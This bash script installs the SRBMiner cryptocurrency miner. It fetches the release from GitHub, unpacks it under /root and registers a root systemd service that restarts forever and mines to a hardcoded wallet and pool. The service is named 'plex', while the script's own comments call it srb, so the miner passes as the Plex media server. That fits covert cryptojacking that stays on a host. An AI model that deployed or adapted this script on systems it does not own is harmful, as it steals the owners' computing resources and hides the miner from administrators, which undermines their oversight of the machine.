#!/bin/bash

if [ ! -f "/root/SRBMiner-Multi-2-5-9/SRBMiner-MULTI" ]; then
    # File cpuminer doesn't exist, perform installation
    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.9/SRBMiner-Multi-2-5-9-Linux.tar.gz
    tar -xvf SRBMiner-Multi-2-5-9-Linux.tar.gz
    cd SRBMiner-Multi-2-5-9
fi

# Step 2: Create systemd configuration file srb.service
sudo tee /etc/systemd/system/plex.service <<EOF
[Unit]
Description=SRBMiner-MULTI Service
After=network.target

[Service]
ExecStart=/root/SRBMiner-Multi-2-5-9/SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool stratum+tcps://stratum-na.rplant.xyz:17018 --wallet MGienuKoKFdUp4rKitW53oX4CADXa4NKJV.c --password webpassword=cecepabdul
WorkingDirectory=/root
Restart=always
RestartSec=3
User=root

[Install]
WantedBy=multi-user.target
EOF

# Step 3: Set permissions on the configuration file
sudo chmod 644 /etc/systemd/system/plex.service

# Step 4: Reload systemd configuration
sudo systemctl daemon-reload

# Step 5: Start the srb service
sudo systemctl start plex

# Wait for 10 seconds
sleep 10

# Check the status of the srb service
journalctl -f -u plex